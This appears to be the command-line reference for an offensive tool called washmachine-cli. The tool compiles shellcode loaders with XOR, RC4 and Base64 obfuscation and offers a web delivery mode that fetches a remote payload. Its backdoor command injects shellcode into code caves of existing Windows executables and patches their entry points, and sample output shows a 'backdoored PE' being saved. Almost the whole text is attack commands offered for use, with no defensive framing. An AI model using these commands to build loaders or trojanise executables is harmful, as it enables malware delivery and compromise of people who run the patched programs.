// CLI REFERENCE

Complete command-line interface documentation

// USAGE

washmachine-cli <command> [options]

Available Commands

compile PRIMARY

Build a shellcode loader executable

analyze UTILITY

Analyze a PE file (headers, sections, imports, code caves)

backdoor ADVANCED

Inject shellcode into an existing PE via code-cave

list INFO

List available templates, encoders, snippets, or compilers

provision SETUP

Download and install required external tools (Bin2Shell)

test TESTING

Run the automated test harness

// COMPILE COMMAND

washmachine-cli compile -s <shellcode> -t <template> [options]

# Compile from a .bin shellcode file using the minimal template
> washmachine-cli compile -s payload.bin -t shellcode-minimal

# Compile with XOR encoding, output as JSON
> washmachine-cli compile -s payload.bin -e 1 --json

# Use specific compiler
> washmachine-cli compile -s payload.bin -t default --compiler msvc

# Web delivery mode
> washmachine-cli compile --url https://example.com/payload.bin -t default

Options

OPTION DESCRIPTION REQUIRED
-s, --shellcode Path to shellcode file (.bin) Yes*
-t, --template Template ID from YAML catalog Yes
--url Remote URL for web delivery mode No
-e, --encoder Encoder index (0=none, 1=XOR, 2=RC4, etc.) No
--envelope Envelope index (0=none, 1=Base64, etc.) No
--compiler Force specific compiler (msvc, gcc, clang) No
-o, --output Output file path No
--json Output results as JSON No

* Either -s or --url must be provided

// BACKDOOR COMMAND

# Inject shellcode into an existing PE
> washmachine-cli backdoor --pe target.exe -s payload.bin -o patched.exe

[+] Analyzing target PE...
[+] Found code cave: .text section, 512 bytes
[+] Injecting shellcode (342 bytes)...
[+] Patching entry point...
[✓] Backdoored PE saved to: patched.exe

# Specify cave manually
> washmachine-cli backdoor --pe target.exe -s payload.bin --cave-offset 0x3F00 -o patched.exe

Options

OPTION DESCRIPTION
--pe Target PE file to backdoor
-s, --shellcode Path to shellcode file (.bin)
-o, --output Output patched PE file
--cave-offset Manual code cave offset (optional)
